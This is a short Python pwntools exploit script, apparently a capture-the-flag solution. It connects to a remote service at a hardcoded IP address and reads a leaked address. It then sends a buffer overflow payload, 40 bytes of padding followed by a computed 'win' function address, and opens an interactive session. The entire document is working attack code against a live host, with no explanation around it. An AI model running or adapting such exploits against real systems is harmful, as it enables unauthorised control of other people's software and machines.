from pwn import *
import chardet


# r = process("./service")
r = remote("107.21.135.41","3333")
r.recvuntil("menu: ")
r.sendline(b'1')
print(r.recvuntil("Address: "))

x = r.recvuntil(b'\n')

reg = int(x,16)
win = reg - 719
winaddress = hex(win)

input = b'a'*40 + p64(win)
detected_encoding = chardet.detect(input)["encoding"]
print(detected_encoding)
print("The Input is as follows: " + input.decode(detected_encoding) + "\n")

r.recv()
r.send(input)
r.interactive()